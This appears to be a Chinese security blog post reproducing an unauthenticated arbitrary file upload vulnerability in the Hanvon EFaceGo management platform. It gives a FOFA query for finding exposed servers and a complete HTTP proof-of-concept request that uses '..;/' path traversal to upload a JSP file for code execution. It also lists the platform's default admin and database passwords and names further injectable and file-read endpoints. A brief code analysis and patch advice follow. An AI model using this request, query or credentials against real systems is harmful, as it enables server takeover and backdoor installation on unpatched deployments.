> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkyNTYxNDAwNQ==&mid=2247484898&idx=1&sn=8398d7bfb2fa31deb03c63d073a09293

#  【漏洞复现】汉王EFaceGo upload.do 任意文件上传漏洞  
PokerSec  PokerSec   2025-07-09 01:01  
  
**先关注，不迷路.**  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
       汉王e脸通综合管理平台是一个集生物识别、大数据、NFC射频、计算机网络、自动控制等技术于一体，通过“人脸卡”及关联信息实现多种功能智能管理，打造从云端到终端一体化应用，广泛应用于智慧园区、社区、工地等领域的综合管理平台。汉王EFaceGo upload.do 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限。  
## fofa  

```
icon_hash=&#34;1380907357&#34;
```

## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJI3pW83icPz0nPPmg1nxohibMQEYJXvPWr9Ts2MwvtJI0YHt8kz5V7xAG8XNB96tFRSmKZVXs0HzvtA/640?wx_fmt=png&from=appmsg "")  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  

```
POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1
Host: 192.168.168.135:8100
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Length: 199


------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;1.jsp&#34;
Content-Type: image/jpeg


test
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJI3pW83icPz0nPPmg1nxohibMY14rLuz5NLqjmCA3XQibCb4VibbwH8DuNn2uNDIribZU7oiatHArKS8cBA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJI3pW83icPz0nPPmg1nxohibM9HLgibmmR4FGaW3mDhkOUJb4nEQdJibibHm0Ogwzz7juxZNaonc9YxXng/640?wx_fmt=png&from=appmsg "")  
##   
## 漏洞分析  
  
系统主serverjar文件采用了加密，从内存中dump出类信息：  
  
1、绕过nginx反向代理限制   
  
tomcat在规范化处理url时会将/..;/替换为/../但是nginx不会做特殊处理，所以就可以在tomcat侧实现路径穿越  
  
2、系统中一些白名单路由：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJI3pW83icPz0nPPmg1nxohibMhWVGVKopcrw1ialQvq7Q8Fz7Qlkq4OvOJyJt50iaXpF2WJC4aqJMjkOg/640?wx_fmt=png&from=appmsg "")  
  
  
webapps\manage\WEB-INF\lib\iface.server-1.0.jar!\com\hanvon\iface\web\controller\operationManage\ResourceUploadController.class  
  
文件上传，并未做限制，直接获取文件类型进行拼接  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJI3pW83icPz0nPPmg1nxohibMgLfecdhjlb9ht7WCyLiam2hce3losRURnSgicricB41DgHsSntiaRslDPQ/640?wx_fmt=png&from=appmsg "")  
  
系统默认密码  

```
admin/123654
```

  
数据库配置,采用自带加密：  
  

```
root/kq_123654
```

  
目前被公开包括queryAlarmEvent.do、queryBlackList.do、queryManyPeopleGroupList.do、getGroupEmployee.do接口sql注入、  
exportResourceByFilePath.do、fileDownload.do、imgDownload.do接口存在任意文件读取漏洞、uploadMeetingFile.do接口存在任意文件上传漏洞。  
## 修复意见  
  
目前官方已发布漏洞修复版本，建议用户升级到安全版本：  
  
https://hwzy99.com/  
  
  
  
如有侵权，请及时联系删除。  
  
  
